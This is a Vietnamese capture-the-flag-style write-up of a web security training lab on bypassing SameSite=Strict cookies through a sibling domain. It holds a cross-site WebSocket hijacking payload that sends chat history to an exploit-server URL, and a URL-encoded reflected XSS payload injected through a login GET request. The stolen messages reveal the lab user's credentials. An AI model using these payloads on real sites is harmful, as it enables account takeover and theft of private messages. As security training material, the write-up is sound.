# Bypassing SameSite restrictions via vulnerable sibling domains

1. SameSite Cookie là gì? 

    SameSite là tính năng bảo mật của trình duyệt, ngăn cookie được gửi tự động trong **cross-site requests** (từ trang web khác). Ví dụ, nếu bạn đang ở **evil.com**, trình duyệt sẽ không gửi cookie của **bank.com** cho **evil.com** (trừ khi set cookie **SameSite=None**).

2. Sibling Domains là gì? 

- Là các **subdomain** cùng thuộc một **domain chính**. Ví dụ: 

    - **shop.example.com** và **blog.example.com** là "sibling" vì cùng thuộc **example.com**

- Trình duyệt coi chúng là **same-site**, dù khác subdomain.

3. Vấn đề xảy ra khi một Sibling Domain bị hack

- Giả sử, **shop.example.com** có lỗ hổng **XSS** (cho phép inject mã độc).

- Hacker có thể lợi dụng XSS ở **shop.example.com** để **gửi request đến blog.example.com**.

- Vì là **same-site**, trình duyệt **vẫn gửi cookie** của **blog.example.com** cho request này (dù có SameSite!)!

    --> Hacker chiếm quyền điều khiển Login session của bạn trên **blog.example.com**.

4. Tấn công trong thực tế thế nào? 

- Ví dụ: 

    - Bạn đã login vào **blog.example.com** (cookie có SameSite=Lax).
    
    - Hacker dụ bạn truy cập **shop.example.com** (bị XSS).

    - Site này chạy script độc: 

            fetch("https://blog.example.com/change-password", { method: "POST", body: "new_password=hacker123" })
    
    - Trình duyệt **gửi cookie** của **blog.example.com** kèm request này vì cùng site --> Password của bạn bị đổi.

5. WebSocket Hijacking (CSWSH)

- Nếu website dùng **WebSocket** (ví dụ: chat real-time), hacker có thể dùng lỗi tương tự để chiếm kết nối WebSocket.

- Kết quả: Hacker đọc trộm tin nhắn, gửi tin giả mạo,... mà bạn không biết.

# Lab: SameSite Strict bypass via sibling domain
![img](https://imgur.com/tCO2Zqs.png)

### Web page:
![img](https://imgur.com/KbdmHha.png)

### Solution:

Xem qua chức năng Live Chat: 

![img](https://imgur.com/Gf7zmSn.png)

Thử gửi 1 vài message: 

![img](https://imgur.com/AmclEf4.png)

Trong HTTP history trong Burp, tìm thấy WebSocket handshake request: 

![img](https://imgur.com/gdlpQgq.png)

--> Không chứa bất kỳ unpredictable tokens nào --> có thể bị tấn công CSWSH nếu có thể bypass bất kỳ SameSite cookie restrictions nào.

Refresh lại page, trong WebSockets History tìm được: 

![img](https://imgur.com/vuSwp3L.png)

--> Trình duyệt gửi READY message tới server. Điều này khiến server phản hồi với toàn hộ lịch sử chat.

Thử Send message này trong Repeater để xác nhận: 

![img](https://imgur.com/vFynpbT.png)

Kiểm tra response HTML của endpoint /chat: 

![img](https://imgur.com/znyL0fQ.png)

Tìm ra địa chỉ WebSocketSecure. Tiếp tục kiểm tra file chat.js:

![img](https://imgur.com/d7IEFna.png)

--> Nhận thấy địa chỉ WSS được sử dụng để khởi tạo 1 websocket mới. Khi kết nối websocket mới được mở, READY message được gửi đến websocket.

Cần tạo 1 payload để thực sự lấy message và chuyển nó đến endpoint mà ta kiểm soát, vì vậy cần tạo payload có dạng sau: 

        let newWebSocket = new WebSocket(chatForm.getAttribute("action"));

        newWebSocket.onopen = function (evt) {
            writeMessage("system", "System:", "No chat history on record");
            newWebSocket.send("READY"); 
        }

        newWebSocket.onmessage = function (evt) {
            var message = evt.data;
        }

Thay đổi thành: 

        let newWebSocket = new WebSocket("wss://0a2500c0040995d582ea1fac00000038.web-security-academy.net/chat");

        newWebSocket.onopen = function (evt) {
            newWebSocket.send("READY"); 
        }

        newWebSocket.onmessage = function (evt) {
            var message = evt.data;
            fetch("https://exploit-0a9b00b2048b951e82cc1ee0012c00cd.exploit-server.net/exploit?message=" + btoa(message))
        }

Sử dụng hàm fetch() để gửi message đến endpoint được kiểm soát (ở đây là exploit server), đồng thời thêm query param "message" được WebSocket gửi tới, nhưng được mã hóa base64. Thử thêm payload này vào exploit server: 

![img](https://imgur.com/jZg1SQh.png)

Click Deliver exploit to victim và chờ vài giây. Sau đó kiểm tra Access log để kiểm tra: 

![img](https://imgur.com/wh1Ewob.png)

--> Đã có thể xem được 1 message từ nạn nhân. Thử decode message này: 

![img](https://imgur.com/V5oF6dD.png)

Vì SameSite=Strict được set nên chỉ thấy được message cho chat session mới nên cần tìm cách bypass. 

Vì website là 1 blog nên sẽ tìm ra chỗ nào có thể chứa payload, như phần comments, tìm kiếm trong comments xem có field nào dễ bị tấn công không. Ta sẽ chứa payload trong field đó và gửi cho nạn nhân 1 link đến post chứa payload ta đã chèn thông qua cross-site scripting. 

Thử view detail 1 sản phẩm: 

![img](https://imgur.com/zG5vv7J.png)

Không có phần comment, không chèn payload vào comment được. Tìm kiếm xem trong các request có request nào có khả năng store payload không. 

![img](https://imgur.com/F0sU2nM.png)

Tìm thấy thông tin rằng server cho phép truy cập data từ 1 sibling domains khác thông qua Access-Control-Allow-Origin header: *https://cms-0aff007b04d94d5184be83380032000d.web-security-academy.net*

--> Có thể store payload ở domain này.

Thử truy cập domain: 

![img](https://imgur.com/nDIIJAl.png)

Thử check xem login form này có dễ bị tấn công không: 

![img](https://imgur.com/69LVZ3J.png)

![img](https://imgur.com/oD2t33h.png)

--> Dễ bị tấn công. Kiểm tra lại Login request này trong Burp Suite: 

![img](https://imgur.com/bKInjxI.png)

--> Thành công inject đoạn script vào username. 

Thử thay đổi POST thành GET request: 

![img](https://imgur.com/qXkBEri.png)

![img](https://imgur.com/P0kQWgQ.png)

--> Server vẫn chấp nhận GET request.

Lấy lại đoạn payload và mã hóa dưới dạng URL: 

![img](https://imgur.com/bxisJZl.png)

Chèn payload đã encode vào username field: 

![img](https://imgur.com/gYV5ICH.png)

Send thử Request này: 

![img](https://imgur.com/Qw0Ibvh.png)

--> Chèn payload thành công vào username field.

Tạo payload mới:

    <script>
    document.location = "https://cms-0a2500c0040995d582ea1fac00000038.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%6c%65%74%20%6e%65%77%57%65%62%53%6f%63%6b%65%74%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%22%77%73%73%3a%2f%2f%30%61%32%35%30%30%63%30%30%34%30%39%39%35%64%35%38%32%65%61%31%66%61%63%30%30%30%30%30%30%33%38%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%22%29%3b%0a%0a%20%20%20%20%20%20%20%20%6e%65%77%57%65%62%53%6f%63%6b%65%74%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%20%28%65%76%74%29%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%6e%65%77%57%65%62%53%6f%63%6b%65%74%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%20%0a%20%20%20%20%20%20%20%20%7d%0a%0a%20%20%20%20%20%20%20%20%6e%65%77%57%65%62%53%6f%63%6b%65%74%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%20%28%65%76%74%29%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%76%61%72%20%6d%65%73%73%61%67%65%20%3d%20%65%76%74%2e%64%61%74%61%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%66%65%74%63%68%28%22%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%39%62%30%30%62%32%30%34%38%62%39%35%31%65%38%32%63%63%31%65%65%30%30%31%32%63%30%30%63%64%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%6d%65%73%73%61%67%65%3d%22%20%2b%20%62%74%6f%61%28%6d%65%73%73%61%67%65%29%29%0a%20%20%20%20%20%20%20%20%7d%0a%3c%2f%73%63%72%69%70%74%3e&password=123456";
    </script>

![img](https://imgur.com/2aIQzcv.png)

Store và Deliver exploit to victim sau đó đợi vài giây và kiểm tra Access log: 

![img](https://imgur.com/q0sWwfB.png)

-->Message của nạn nhân đã được gửi đến endpoint. 

Giải mã message: 

![img](https://imgur.com/QzeJ0Y0.png)

Tìm ra username là carlos và password 5dz7yll20o0fzc5tzz65. Thử Login: 

![img](https://imgur.com/zr9RicF.png)

Solved the lab!

![img](https://imgur.com/uk1OWWI.png)






